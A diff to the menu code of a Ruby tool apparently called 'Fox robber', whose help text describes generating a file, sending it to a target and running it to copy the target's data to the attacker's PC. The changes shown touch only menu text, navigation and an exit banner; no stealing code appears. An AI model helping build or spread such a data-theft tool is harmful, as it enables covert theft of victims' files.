@@ -4,7 +4,7 @@ module All
     def explain
       system('clear')
       puts "** Hi Hackers.
-      Welcome to the Fox robber. The Fox robber can make some file to steal a lot of data and save it.\n**********************************************************************************************************\n** How to use it?\n(1). First, you have to make a Fox robber file, Enter number 1 to make a a Fox robber file; Then you have to see a lot of option to make your own Fox robber file.\n(2). Send the file for your target.\n(3). Run the file.\n(4). The END. you copied your target data and you can see your targets files in your PC.\n[0]. back"
+      Welcome to the Fox robber. The Fox robber can make some file to steal a lot of data and save it.\n**********************************************************************************************************\n** How to use it?\n(1). First, you have to make a Fox robber file, Enter number 1 to make a a Fox robber file; Then you have to see a lot of option to make your own Fox robber file.\n(2). Send the file for your target.\n(3). Run the file.\n(4). The END. you copied your target data and you can see your targets files in your PC.\n[0]. back\nWrite \"exit\" to exit in first page."
     end
   end
 
@@ -34,7 +34,7 @@ while true
       job = 'fox-robber'
       print "(#{job})>"
       command_fox_robber = gets.chomp
-      if %w[4 back].include?(command_fox_robber)
+      if %w[4 fox-robber].include?(command_fox_robber)
         while true
           if %w[0 back].include?(command_fox_robber)
             system('clear')
@@ -67,6 +67,9 @@ while true
             end
           end
         end
+        break
+      elsif %w[0 back].include?(command_fox_robber)
+        system('clear')
         break
       else
         puts $error
@@ -106,6 +109,9 @@ while true
   when '0', 'back'
     next
   when 'exit'
+    system('clear')
+    system('chafa images.png')
+    system("echo \t\"FOX ROBBER\" | lolcat -a -d 30")
     system('clear')
     exit
   else
